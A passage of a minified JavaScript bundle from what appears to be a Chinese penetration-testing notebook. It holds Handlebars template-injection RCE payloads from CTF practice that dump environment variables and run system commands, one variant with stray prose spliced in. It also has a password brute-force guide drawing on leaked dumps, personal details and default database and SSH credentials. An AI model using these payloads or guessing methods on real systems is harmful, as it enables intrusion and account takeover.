2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014")}),i})}();return m.a.createElement("div",{style:Object(r.a)({},F.y)},_.map(function(o){return m.a.createElement("div",null,"\u3010",o,"\u3011\uFF1A",m.a.createElement(l.a,{value:T[o],onChange:function(f){j.simple_set_and_save(o,f,T,R)}}))}),s.map(function(o){return m.a.createElement(m.a.Fragment,null,Object(F.o)("\u6A21\u677F\u751F\u6210\u3010".concat(O,"\u3011"),o),y==null?void 0:y(o,O))}))},w=function a(){Object(S.a)(this,a)};w.SSTI={HandleBars:{\u4ECB\u7ECD:"Server-Side Template Injection",\u76F8\u5173\u6280\u5DE7:m.a.createElement(m.a.Fragment,null,m.a.createElement(h,{special_name:"HandleBars",var_names_arr:["code"],code_template_arr:[`
                {{#with "s" as |string|}}
                   {{#with "e"}}
                       {{#with split as |conslist|}}
                           {{this.pop}}
                           {{this.push (lookup string.sub "constructor")}}
                           {{this.pop}}
                           {{#with string.split as |codelist|}}
                               {{this.pop}}
                               {{this.push "return  ###<code>###  ;"}}
                               {{this.pop}}
                               {{#each conslist}}
                                   {{#with (string.sub.apply 0 codelist)}}
                                       {{this}}
                                   {{/with}}
                               {{/each}}
                           {{/with}}
                       {{/with}}
                   {{/with}}
                {{/with}}
        `],gen_str_transfer_fn:function(B){return g(B,"URL\u7F16\u7801")}}),`

    \u76F8\u5173\u6280\u5DE7\u8BF4\u660E\uFF1A
        https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs
        \u539F\u59CB\u6750\u6599\u6765\u6E90\uFF1Ahttps://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/#RCE-%F0%9F%92%A3

    \u8FDB\u4E00\u6B65\uFF1A
        \u6709\u65F6\u5019\uFF0C\u4F1A\u9047\u5230\u3010require\u3011\u65E0\u6CD5\u8BBF\u95EE\u7684\u95EE\u9898\u3002\u6B64\u65F6\uFF0C\u53EF\u80FD\u662F\u9047\u5230\u4E86\u3010\u6C99\u76D2\u6A21\u5F0F\u3011

        \u7136\u540E\uFF0C\u3010require("process").exec\u3011\u6709\u65F6\u5019\uFF0C\u65E0\u6CD5\u7ACB\u5373\u5F97\u5230\u7ED3\u679C\uFF1A
            1. exec\uFF0C      \u662F\u3010\u5F02\u6B65\u65B9\u6CD5\u3011
            2. execSync\uFF0C  \u662F\u3010\u540C\u6B65\u65B9\u6CD5\u3011

    Exp
        \uFF08\u9776\u573A\uFF0C\u5F53\u65F6\u662F\u53EF\u4EE5\u76F4\u63A5\u6267\u884C\u7684\uFF0C\u5148\u7528UrlEncode\u4E00\u4E0B\u3002\uFF09


        \u4E00\u4E9B\u3010CTF\u60AC\u8D4F\u3011\u7684\u7B54\u6848\uFF1A

                <!-- (by [@avlidienbrunn](https://twitter.com/avlidienbrunn)) -->

                {{#with "s" as |string|}}
                  {{#with "e"}}
                    {{#with split as |conslist|}}
                      {{this.pop}}
                      {{this.push (lookup string.sub "constructor")}}
                      {{this.pop}}
                      {{#with string.split as |codelist|}}
                        {{this.pop}}
                        {{this.push "return JSON.stringify(process.env);"}}
                        {{this.pop}}
                        {{#each conslist}}
                          {{#with (string.sub.apply 0 codelist)}}
                            {{this}}
                          {{/with}}
                        {{/each}}
                      {{/with}}
                    {{/with}}
                  {{/with}}
                {{/with}}

        \u4E00\u4E9B\u63A2\u6D4B\uFF0C\u63A2\u6D4B\u3010process\u3011\u662F\u5426\u6709\u6548\uFF1A
                {{#with "s" as |string|}}
                   {{#with "e"}}
                     {{#with split as |conslist|}}
                         {{this.pop}}
                         {{this.push (lookup string.sub "constructor")}}
                         {{this.pop}}
                         {{#with string.split as |codelist|}}
                         {{this.pop}}
                         {{this.push "return process;"}}
                         {{this.pop}}
                         {{#each conslist}}
                           {{#with (string.sub.apply 0 codelist)}}
                             {{this}}
                           {{/with}}
                         {{/each}}
                       {{/with}}
                     {{/with}}
                   {{/with}}
                {{/with}}

        \u4E00\u4E9B\u63A2\u6D4B\uFF0C\u63A2\u6D4B\u3010process.mainModule\u3011\u662F\u5426\u6709\u6548\uFF1A
                {{#with "s" as |string|}}
                   {{#with "e"}}
                       {{#with split as |conslist|}}
                           {{this.pop}}
                           {{this.push (lookup string.sub "constructor")}}
                           {{this.pop}}
                           {{#with string.split as |codelist|}}
                               {{this.pop}}
                               {{this.push "return process.mainModule;"}}
                               {{this.pop}}
                               {{#each conslist}}
                                   {{#with (string.sub.apply 0 codelist)}}
                                      {{this}}
                                   {{/with}}
                               {{/each}}
                           {{/with}}
                       {{/with}}
                   {{/with}}
                {{/with}}

        \u4E00\u4E9B\u63A2\u6D4B\uFF0C\u63A2\u6D4B\u3010process.mainModule.require('child_process')\u3011\u662F\u5426\u6709\u6548\uFF1A
                {{#with "s" as |string|}}
                   {{#with "e"}}
                       {{#with split as |conslist|}}
                           {{this.pop}}
                           {{this.push (lookup string.sub "constructor")}}
                           {{this.pop}}
                           {{#with string.split as |codelist|}}
                               {{this.pop}}
                               {{this.push "return process.mainModule.require('child_process');"}}
                               {{this.pop}}
                               {{#each conslist}}
                                   {{#with (string.sub.apply 0 codelist)}}
                                      After URL encoding and sending the payload, we get the following response from the server:
                                      The require object has been called successfully and the child_process module loaded. Let's now
                                      attempt to run system commands.
                                      We will need to URL encode the above payload once again.
                                       {{this}}
                                   {{/with}}
                               {{/each}}
                           {{/with}}
                       {{/with}}
                   {{/with}}
                {{/with}}

        \u4E00\u4E9B\u63A2\u6D4B\uFF0C\u63A2\u6D4B\u3010process.mainModule.require('child_process').execSync('whoami')\u3011\u662F\u5426\u6709\u6548\uFF1A
                \uFF08\u5DF2\u7ECF\uFF0C\u83B7\u5F97\u4E86\u3010whoami\u3011  \u6267\u884C\u7684\u7ED3\u679C\uFF01\uFF01\uFF09

                {{#with "s" as |string|}}
                   {{#with "e"}}
                       {{#with split as |conslist|}}
                           {{this.pop}}
                           {{this.push (lookup string.sub "constructor")}}
                           {{this.pop}}
                           {{#with string.split as |codelist|}}
                               {{this.pop}}
                               {{this.push "return    process.mainModule.require('child_process').execSync('whoami');"}}
                               {{this.pop}}
                               {{#each conslist}}
                                   {{#with (string.sub.apply 0 codelist)}}
                                       {{this}}
                                   {{/with}}
                               {{/each}}
                           {{/with}}
                       {{/with}}
                   {{/with}}
                {{/with}}


                \u5728\u3010\u8FD9\u4E2APoC\u3011\u6D4B\u8BD5\u6210\u529F\u540E\uFF0C\u540E\u9762\u7684\u6D4B\u8BD5\uFF0C\u5C31\u90FD\u662F\u3010\u9010\u6B65\u8FD0\u884C\u547D\u4EE4\u3011\u4E86\uFF01\uFF01
                    \u3010 process.mainModule.require('child_process').execSync('ls /root');  \u3011
                    \u3010 process.mainModule.require('child_process').execSync('cat /root/flag.txt');  \u3011

                \u5982\u6B64\u9012\u5F52\uFF0C\u5F88\u5FEB\u5C31\u53EF\u4EE5\u62FF\u5230\u3010Flag.txt\u3011\u3002


    `)}},w.Jenkins=m.a.createElement(m.a.Fragment,null,`
              \u8A79\u91D1\u65AF-HackTricks
                  https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins
  `),w.mssql_sqlserver=m.a.createElement(m.a.Fragment,null,`
      MSSQL - Microsoft SQL Server
          https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
  `),w.CodeReview_\u4EE3\u7801\u5BA1\u8BA1={\u8BB0\u5F55\u7684_\u5BA1\u8BA1\u5DE5\u5177:m.a.createElement(m.a.Fragment,null,`
      \u5BA1\u8BA1\u5DE5\u5177\uFF1A

          https://book.hacktricks.xyz/pentesting/pentesting-web/code-review-tools
    `),\u5728\u7F51\u9875\u5BA1\u8BA1\u4E2D_\u4ECB\u4E8E\u767D\u76D2\u548C\u9ED1\u76D2\u4E4B\u95F4:m.a.createElement(m.a.Fragment,null,`
      \u5728\u7F51\u9875\u5BA1\u8BA1\u4E2D\uFF0C\u4ECB\u4E8E\u767D\u76D2\u548C\u9ED1\u76D2\u4E4B\u95F4\uFF1A

          https://book.hacktricks.xyz/pentesting/pentesting-web#source-code-review
    `),\u4E91\u5B89\u5168_CloudSecurity:m.a.createElement(m.a.Fragment,null,`
      \u3010\u4E91\u5B89\u5168\u3011\u4EE3\u7801\u5BA1\u8BA1\uFF1A

          https://book.hacktricks.xyz/cloud-security/cloud-security-review
    `)}},sboe:function(H,d,n){"use strict";n.d(d,"a",function(){return l});var S=n("q1tI"),t=n.n(S),l=S.createContext(null)},siMk:function(H,d,n){H.exports={resultList_Item:"resultList_Item___6m1VJ",forceRemove_notificationCloseIcon:"forceRemove_notificationCloseIcon___3YNKU"}},thHx:function(H,d,n){H.exports={circleSketchHighlight:"circleSketchHighlight___2qnX-"}},v56E:function(H,d,n){},vhfr:function(H,d,n){"use strict";n.d(d,"a",function(){return S});function S(){return function(t){}}},w5pM:function(H,d,n){"use strict";var S=n("VTBJ"),t=n("q1tI"),l={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M696 480H544V328c0-4.4-3.6-8-8-8h-48c-4.4 0-8 3.6-8 8v152H328c-4.4 0-8 3.6-8 8v48c0 4.4 3.6 8 8 8h152v152c0 4.4 3.6 8 8 8h48c4.4 0 8-3.6 8-8V544h152c4.4 0 8-3.6 8-8v-48c0-4.4-3.6-8-8-8z"}},{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"}}]},name:"plus-circle",theme:"outlined"},r=l,e=n("6VBw"),u=function(F,p){return t.createElement(e.a,Object(S.a)(Object(S.a)({},F),{},{ref:p,icon:r}))};u.displayName="PlusCircleOutlined";var m=d.a=t.forwardRef(u)},wlus:function(H,d,n){"use strict";var S=n("VTBJ"),t=n("q1tI"),l={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M696 480H328c-4.4 0-8 3.6-8 8v48c0 4.4 3.6 8 8 8h368c4.4 0 8-3.6 8-8v-48c0-4.4-3.6-8-8-8z"}},{tag:"path",attrs:{d:"M512 64C264.6 64 64 264.6 64 512s200.6 448 448 448 448-200.6 448-448S759.4 64 512 64zm0 820c-205.4 0-372-166.6-372-372s166.6-372 372-372 372 166.6 372 372-166.6 372-372 372z"}}]},name:"minus-circle",theme:"outlined"},r=l,e=n("6VBw"),u=function(F,p){return t.createElement(e.a,Object(S.a)(Object(S.a)({},F),{},{ref:p,icon:r}))};u.displayName="MinusCircleOutlined";var m=d.a=t.forwardRef(u)},"yEy/":function(H,d,n){"use strict";n.r(d),n.d(d,"\u5E38\u7528\u8BCD\u5178_Helper",function(){return p}),n.d(d,"\u8BCD\u5178_\u5BC6\u7801_\u53E3\u4EE4_\u7F16\u7801_\u7206\u7834_\u624B\u518C",function(){return g});var S=n("fWQN"),t=n("q1tI"),l=n.n(t),r=n("ysNt"),e=n("AkKX"),u=n("FOD2"),m=n("s1IG"),E=n("jJ7j"),F=r.l.singleATag_blank,p=function c(){Object(S.a)(this,c)};p.HTB_\u63D0\u4F9B\u8BCD\u5178=`
          HTB_\u63D0\u4F9B\u8BCD\u5178


                          "/usr/share/wordlists"                                \uFF08\u8FD9\u4E2A\u4F3C\u4E4E\u66F4\u597D\u7528\uFF09

                              /dirb

                                  /common.txt

                              /dirbuster

                                  /directory-list-2.3-small.txt



                          "/home/htb-hanshou101/Desktop/Useful Repos/SecLists"  \uFF08\u6709\u65F6\u5019\uFF0C\u5C0F\u8BCD\u5178\u641C\u4E0D\u5230\u4E1C\u897F\uFF09

                              /Discovery                                        (\u76EE\u5F55\u7206\u7834\uFF0C\u63A2\u7D22\u722C\u866B)

                                  /Web-Content                                  (\u7F51\u7AD9\u76EE\u5F55)

                                      \u3010\u901A\u7528\u3011
                                          /common.txt
                                      \u3010PHP\u3011
                                          /SVNDigger/cat/Language/php.txt
                                          /PHP.fuzz.txt
                                          /CMS/php-nuke.fuzz.txt
                                      \u3010JSP\u3011
                                          /SVNDigger/cat/Language/jsp.txt



                          "/usr/share/wordlists"

                              /rockyou.txt

                                  \uFF08\u5E38\u7528\u4E8E\u672C\u5730\u5BC6\u7801\u7206\u7834\uFF0C\u5982zip\u5305\uFF09
                                  \u6BD4\u5982\u7528\u3010john\u3011\u5DE5\u5177\uFF0C\u89C1\u300A\u300B

  `;var I={name:"\u3010\u8BCD\u5178\u3011_\u3010\u5BC6\u7801\u3011_\u3010\u53E3\u4EE4\u3011_\u3010\u7F16\u7801\u3011_\u3010\u7206\u7834\u3011_\u624B\u518C",desc:l.a.createElement(l.a.Fragment,null,e.a.\u4E0D\u4E8C\u6B21\u72AF\u9519_KEY.\u679A\u4E3E_\u539F\u7406_\u751F\u6548\u672C\u8D28),steps:[{name:"\u672C\u8D28\u548C\u601D\u8DEF",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u91CD\u8981\u601D\u8DEF\u6587\u732E\uFF1A
                  \uFF082014\u5E74\u6587\u7AE0\uFF09\u5B89\u5168\u8FD0\u8425\uFF1A\u5F31\u53E3\u4EE4\uFF0C\u4F01\u4E1A\u5B89\u5168\u7684\u575F\u5893 | | \u5B89\u4E91\u7F51 \u2013 AnYun.ORG
                      https://anyun.org/a/seayxinxianquanboke/2017/0213/8572.html

          \u5E38\u89C1\u5BC6\u7801\u5F62\u5F0F\uFF1A
                  \u2460 \u5E38\u7528\u7B80\u5355\u6570\u5B57\u3001\u5B57\u6BCD
                      \u8FD9\u7C7B\u4E2D\u6700\u5178\u578B\u7684\u4E00\u4E2A\u5BC6\u7801\u5C31\u662F123456\uFF0C\u5728\u6536\u96C6\u5230\u76EE\u6807\u7CFB\u7EDF\u7684\u7528\u6237\u540D\u5217\u8868\u540E\uFF0C\u7528\u8FD9\u4E2A\u5BC6\u7801\u8FDB\u884C\u7206\u7834\u5C61\u8BD5\u4E0D\u723D\u3002
                      \u56E0\u4E3A\u8FD9\u4E32\u6570\u5B57\u6700\u597D\u8BB0\uFF0C\u800C\u4E14\u5728\u5F88\u591AIT\u8BFE\u5802\u4E0A\uFF0C\u5F88\u591A\u8001\u5E08\u76F4\u63A5\u547D\u4EE4\u5B66\u751F\u628A\u6570\u636E\u5E93\u7B49\u5BC6\u7801\u8BBE\u7F6E\u4E3A123456\uFF0C\u6211\u5728\u91CD\u5E86\u8BFB\u4E66\u7684\u65F6\u5019\u5BF9\u8FD9\u4E2A\u6DF1\u6709\u4F53\u4F1A\uFF0C\u8FD9\u662F\u4ECE\u6700\u5F00\u59CB\u5C31\u517B\u6210\u7684\u574F\u4E60\u60EF\u3002

                  \u2461 \u4E2A\u4EBA\u4FE1\u606F\uFF1A\u751F\u65E5\u3001\u540D\u5B57\u62FC\u97F3\u7F29\u5199\u3001ID\u3001QQ\u3001\u624B\u673A
                      \u8FD9\u4E00\u7C7B\u5C5E\u4E8E\u4E2A\u4EBA\u4FE1\u606F\u62FC\u63A5\u7684\u5BC6\u7801\uFF0C\u5F88\u591A\u4EBA\u4E3A\u4E86\u5BC6\u7801\u597D\u8BB0\uFF0C\u5C31\u4F1A\u628A\u201C\u540D\u5B57\u62FC\u97F3\u7F29\u5199+\u751F\u65E5\u201D\u5F53\u6210\u81EA\u5DF1\u7684\u5E38\u7528\u5BC6\u7801\uFF0C\u751A\u81F3\u6709\u5F88\u591A\u76F4\u63A5\u7528\u624B\u673A\u53F7\u3001QQ\u53F7\u4F5C\u4E3A\u5BC6\u7801\u3002

                      \u5BF9\u4E8E\u8FD9\u79CD\uFF0C\u53EA\u8981\u5BF9\u76EE\u6807\u8FD9\u4E2A\u4EBA\u8FDB\u884C\u4E00\u70B9\u7B80\u5355\u7684\u4FE1\u606F\u6536\u96C6\u5373\u53EF\u3002
                          \u4E3E\u4F8B\uFF1A\u9A6C\u4E91\u4EE5\u524D\u7684\u5BC6\u7801\u53EF\u80FD\u5C31\u662F\u4E0B\u9762\u5176\u4E2D\u4E00\u4E2A
                              mayun1234
                              mayun19641015
                              my19641015
                              19641015

                  \u2462 \u57DF\u540D\u3001\u4E2D\u6587\u6216\u82F1\u6587\u540D\u79F0\u6216\u52A0\u6570\u5B57\u3001\u5B57\u6BCD\u3001IP\u5C3E\u6570\u5B57
                      \u8FD9\u7C7B\u4E5F\u662F\u975E\u5E38\u5E38\u89C1\u7684\u4E00\u79CD\uFF0C\u5F88\u591A\u4F01\u4E1A\u5458\u5DE5\u4F1A\u628A\u4E00\u4E9B\u6570\u636E\u5E93\u3001FTP\u3001\u751A\u81F3ssh\u5BC6\u7801\u8BBE\u7F6E\u6210\u81EA\u5DF1\u516C\u53F8\u7684\u57DF\u540D\u524D\u7F00\u6216\u8005\u516C\u53F8\u4E2D\u6587\u540D\u79F0\u62FC\u97F3\u7B49
                          \u6BD4\u5982\u767E\u5EA6\u7684\u5458\u5DE5\u53EF\u80FD\u4F1A\u628A\u5BC6\u7801\u8BBE\u7F6E\u6210\u201Cbaidu\u201D\uFF0C\u56E0\u4E3A\u767E\u5EA6\u7684\u57DF\u540D\u548C\u4E2D\u6587\u62FC\u97F3\u90FD\u662F\u8FD9\u4E2A\uFF0C\u90A3\u8FD9\u4E2A\u5BC6\u7801\u7684\u51FA\u73B0\u6982\u7387\u5C31\u66F4\u9AD8\u4E86\u3002

                      \u8FD8\u6709\u5F88\u591A\u6709\u8DA3\u7684\u5BC6\u7801\u50CF\u201Cbaidu123\u201D\u3001\u201Cbaidu2014\u201D\uFF0CIP\u4E3A10.0.0.39\u7684ssh\u5BC6\u7801\u4E3A\u201Cbaidu39\u201D\u6216\u8005\u66F4\u590D\u6742\u70B9\uFF0C\u4F46\u662F\u6709\u89C4\u5F8B\uFF0C\u8FD9\u4E00\u79CD\u4E5F\u975E\u5E38\u5E38\u89C1\u3002
                      \u5EFA\u8BAE\u5728\u6E17\u900F\u6D4B\u8BD5\u8FC7\u7A0B\u4E2D\u591A\u6574\u7406\u8FD9\u6837\u7684\u5BC6\u7801\u8FDB\u884C\u6D4B\u8BD5\uFF0C\u5F80\u5F80\u90FD\u4F1A\u6709\u60CA\u559C\u54E6\u3002

          \u5E38\u89C1\u5DEE\u5F02\uFF1A

                  \u4E0D\u540C\u4EA7\u54C1\u7684\u4F7F\u7528\u8005\u4EBA\u7FA4\u3001\u4E13\u4E1A\u6027\u5BFC\u81F4\u7684\u4E0D\u540C\u4E60\u60EF
                          \u524D\u7AEF\u666E\u901A\u7528\u6237\u3001Admin\u7BA1\u7406\u7528\u6237\u3001\u5F00\u53D1\u4EBA\u5458

                          \u8FD0\u7EF4\u4EBA\u5458\u3001\u9ED1\u5BA2\u4EBA\u5458

                  \u4E0D\u540C\u56FD\u5BB6\u3001\u4E0D\u540C\u79CD\u65CF\u3001\u4E0D\u540C\u59D3\u540D

                  \u4E0D\u540C\u5E74\u9F84\u5C42\u3001\u63A5\u89E6\u7684\u4E0D\u540C\u6D41\u884C\u6587\u5316



          `))},{name:"\u5C0F\u800C\u7CBE\u2014\u2014\u2014\u2014\u81EA\u5DF1\u624B\u5DE5\u5236\u4F5C   \uFF08\u7F51\u4E0A\u6CA1\u6709\u5C0F\u800C\u7CBE\u7684\uFF0C\u9664\u4E86Fscan\uFF09",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u81EA\u5DF1\u3010\u624B\u5DE5\u5236\u4F5C\u8BCD\u5178\u3011",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u601D\u8DEF\u548C\u5B9E\u73B0",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          \u2460 \u901A\u8FC7\u5BF9\u3010\u62D6\u5E93\u6570\u636E\u3011\u3001\u3010\u5927\u5382\u6CC4\u9732\u3011\uFF0C\u8FDB\u884C\u3010\u5206\u6790\u3011\u3001\u3010\u7EDF\u8BA1\u3011
                  \u6765\u6E90\uFF1A
                          \u5404\u5927Web\u5382\u5546

                          \u5927\u91CF\u6570\u636E\u6CC4\u9732\uFF1A
                                  \u6D77\u5916\uFF1A
                                      \u8FD9\u4E2A\u7AD9\uFF0C\u6D77\u5916\u6BD4\u8F83\u6743\u5A01\uFF1Ahttps://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
                                  \u56FD\u5185\uFF1A
                                      \u964C\u964C\u76F8\u5173\u7684\u5BC6\u7801\u6CC4\u9732\uFF1A
                                          2015\u964C\u964C\u5BC6\u7801\u6570\u636E.7z\uFF1A    https://github.com/evilmt/Password-top-statistics-tool/blob/master/\u793A\u4F8B\uFF1A2015\u964C\u964C\u5BC6\u7801\u6570\u636E.7z

                                      \u4EAC\u4E1C\uFF1A
                                          \u53EA\u6709\u4E00\u90E8\u5206\uFF1A
                                                  \u81EA\u5236\u5F31\u53E3\u4EE4\u8BCD\u5178top100 | \u56DE\u5FC6\u98D8\u5982\u96EA       https://gv7.me/articles/2017/making-the-password-top-100/

                          \u5236\u4F5C\u65B9\u6CD5\uFF1A
                                  \u4F7F\u7528NaviCat+MySQL\uFF1A
                                      mysql\u5F31\u53E3\u4EE4\u8BCD\u5178_\u81EA\u5236\u5F31\u53E3\u4EE4\u8BCD\u5178top100_zLiM5\u7684\u535A\u5BA2-CSDN\u535A\u5BA2
                                          https://blog.csdn.net/weixin_30851261/article/details/113201861


                  \u573A\u666F\uFF1A
                          \u591A\u534A\u662F\u3010\u666E\u901AWeb\u7528\u6237\u3011\u7684\u4E60\u60EF\u6570\u636E\u3002
                              \u4E0D\u5305\u62EC  \u3010\u6570\u636E\u5E93\u3011\u3001\u3010Admin\u7528\u6237\u3011  \u7B49\u3002



          \u2461 \u81EA\u5DF1\u4ECE\u3010\u7F51\u4E0A\u641C\u96C6\u6574\u5408\u3011\u3002    \uFF08\u5F88\u5C11\uFF0C\u6709\u9047\u5230\uFF0C\u4E00\u4EFD\u5B8C\u6574\u7684\u3001\u62FF\u6765\u5C31\u80FD\u7528\u7684\uFF09
                  \u6765\u6E90\uFF1A
                          \u5404\u5927\u5382\u5546\uFF0C\u7ECF\u5E38\u62AB\u9732\u7684  \u3001\u65B0\u53D1\u5E03\u7684
                                  \uFF08\u4E2A\u4EBA\u503E\u5411\u8BA4\u4E3A\uFF0C\u8FD9\u4E9B\u4E5F\u662F  \u3010\u62D6\u5E93\u6570\u636E\u3011\u62FF\u6765\u7684  \uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF09



          `))},{name:"\u73B0\u6210\u5DE5\u5177",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u57FA\u4E8E\u3010\u5DF2\u6709\u8BCD\u5178\u3011\uFF0C\u8FDB\u884C\u3010\u53D8\u79CD\u3011\u3001\u3010\u7B5B\u9009\u3011\u3001\u3010\u7EC4\u5408\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                  \u601D\u8DEF\u4E00\uFF1A\u5229\u7528\u3010\u5DF2\u6709\u8BCD\u5178\u3011\uFF0C\u8FDB\u884C\u7B5B\u9009\u5B57\u7B26\u4E32\uFF0C\u6765\u7B80\u5355\u751F\u6210\u3010\u5B50\u8BCD\u5178\u3011

                          grep  -i  ninja  /usr/share/wordlists/rockyou.txt  >  rockyou_ninja
                                  \u5728\u3010rockyou.txt\u3011\u6587\u4EF6\u4E2D\uFF0C\u67E5\u627E\u3010\u5305\u542Bninja\u3011\u7684\u90E8\u5206\u3002  \u7136\u540E\u751F\u6210\u65B0\u7684\u3010\u5B50\u8BCD\u5178\u3011


                  \u601D\u8DEF\u4E8C\uFF0C\u4F7F\u7528\u3010\u7528\u6237\u4FE1\u606F\u788E\u7247\u3011\u3002\u6765\u5236\u4F5C  \u5B50\u5B57\u5178\u3002

                          \u5BC6\u7801\u5B57\u5178\u751F\u6210\u5668|mayter.cn
                                  \u5730\u5740\uFF1Ahttps://www.shentoushi.top/tools/dict/index.php
                                  \u8D44\u6599\uFF1A
                                          \u5229\u7528\u4EBA\u7684\u5BC6\u7801\u4E60\u60EF \u7CBE\u51C6\u5206\u6790\u5BC6\u7801
                                          \u8F93\u5165\u76EE\u6807\u4FE1\u606F \u731C\u6D4B\u53EF\u80FD\u4F7F\u7528\u7684\u5BC6\u7801
                                                  \u59D3\u540D  \u90AE\u7BB1  \u751F\u65E5  \u7528\u6237\u540D
                                                  \u7279\u6B8A\u6570\u5B57  \u5E38\u7528\u5BC6\u7801  \u4F34\u4FA3\u4FE1\u606F  \u624B\u673A\u53F7\u7801


          `))},{name:"\u901A\u8FC7\u3010Fuzz\u3011\u3001\u3010\u968F\u673A\u7EC4\u5408\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


                  \u601D\u8DEF\u4E00\uFF1A\u4F7F\u7528\u3010radamsa\u3011\uFF0C\u6765\u751F\u6210\u3010\u7279\u5B9A\u8BCD\u5178\u3011

                          \u53C2\u8003\u8D44\u6599\uFF1Ahttps://gitlab.com/akihe/radamsa
                          \u4ECB\u7ECD\uFF1A
                                  \u751F\u6210\u3010\u968F\u673A\u8BCD\u5178\u3011\u548C\u3010\u6D4B\u8BD5\u7528\u4F8B\u3011\u3002
                                  \u53C8\u53EB\u505A\u3010\u6A21\u7CCA\u5668 / fuzzer\u3011\u3002
                          \u4F7F\u7528\uFF1A
                                  radamsa --seed $FFUF_NUM example1.txt example2.txt
                                          \u5728\u3010ffuf\u3011\u4E2D\u4F7F\u7528\u3002
                                  radamsa -n 1000 -o %n.txt example1.txt example2.txt
                                          \u5355\u72EC\u4F7F\u7528\u3002

          `))}]}]},{name:"\u4E13\u9879\u8BCD\u5178\u2014\u2014\u4E13\u4E1A\u9886\u57DF\u8BCD\u5178  \uFF08MySQL\u3001SSH \u7B49\uFF09",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u6570\u636E\u5E93 / \u7F13\u5B58 / \u4E8B\u4EF6\u961F\u5217",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"MySQL",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                      \u7528\u6237\u540D:
                      root

                      \u5BC6\u7801\uFF1A
                      123456


                      `))},{name:"PostGreSQL",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                      \u7528\u6237\u540D\uFF1A
                      postgres

                      \u5BC6\u7801\uFF1A
                      123456

                      `))},{name:"Redis",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                      \u7528\u6237\u540D\uFF1A
                      \uFF08\u65E0\u5BC6\u7801\uFF09

                      \u5BC6\u7801\uFF1A
                      \uFF08\u65E0\u5BC6\u7801\uFF09

                      `))},{name:"MongoDB",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                      \u7528\u6237\u540D\uFF1A
                      \uFF08\u65E0\u5BC6\u7801\uFF09

                      \u5BC6\u7801\uFF1A
                      \uFF08\u65E0\u5BC6\u7801\uFF09

                      `))},{name:"Oracle",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                      \u7528\u6237\u540D\uFF1A
                      test

                      \u5BC6\u7801\uFF1A
                      test


                      `))}]},{name:"OS\u64CD\u4F5C\u7CFB\u7EDF",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"Linux / SSH",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

                      SSH
                          \u8D44\u6599\uFF1A
                              (\u5728\u8FD9\u6BB5\u7684\u672B\u5C3E)\uFF1Ahttps://www.cnblogs.com/bonelee/p/9322684.html   \uFF08\u641C\u3010\u5B8C\u6574\u7684\u5BC6\u7801\u5217\u8868\u3011\uFF09
                              \u539F\u59CB\u94FE\u63A5\u5931\u6548\uFF0C\u8865\u4E0A\u65B0\u94FE\u63A5\uFF1Ahttps://github.com/dipsec/Achilles/blob/master/hasla/sshd_bruteforce_list.txt

                      \u7528\u6237\u540D\uFF1A
                          admin

                          \u9ED8\u8BA4\u81EA\u5E26
                              root

                          \u5E38\u89C1
                              www

                      \u5BC6\u7801\uFF1A
                          123456
                          P@ssw0rd

